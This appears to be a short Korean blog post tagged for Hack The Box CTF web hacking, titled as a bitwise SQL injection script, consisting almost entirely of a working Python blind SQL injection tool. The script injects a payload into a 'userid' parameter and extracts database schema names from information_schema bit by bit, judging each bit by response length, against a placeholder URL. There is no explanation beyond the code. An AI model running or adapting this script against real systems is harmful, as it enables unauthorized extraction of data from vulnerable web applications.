---
title: 비트연산 기반 SQL 인젝션 스크립트
date: 2025-02-11 11:30:00 +0900
tags: HTB CTF 웹해킹
---

https://blog.naver.com/sjhmc9695/221868622766

import urllib.request
import time
import sys

flag = 0
print("Start Blind SQL injection!")
for limit in range(0,999):
	for char in range(1,999):
		bin_string = "0"
		for bit in range(1,8):
			param = "admin' and substr(lpad(bin(ascii(substr((select distinct table_schema from information_schema.columns limit {},1 ),{},1))),7,0),{},1)=1 #"
			param = param.format(limit,char,bit)
			param = urllib.parse.urlencode({"userid":param})
			url = "http://URL?"
			req = urllib.request.Request(url + param)
			response = urllib.request.urlopen(req)
			time.sleep(0.03)
			if len(response.read().decode("utf8")) == 272: #True
				bin_string = bin_string +  "1"
			else:
				bin_string = bin_string +  "0"

		result = chr(int(bin_string,2))
		if result == "\x00":
			flag = flag + 1
			print("")
			if flag == 2:
				print("Done!")
				sys.exit(0)
			break
		elif result != "\x00":
			flag = 0
		print(result, end="")

print("\nDone!")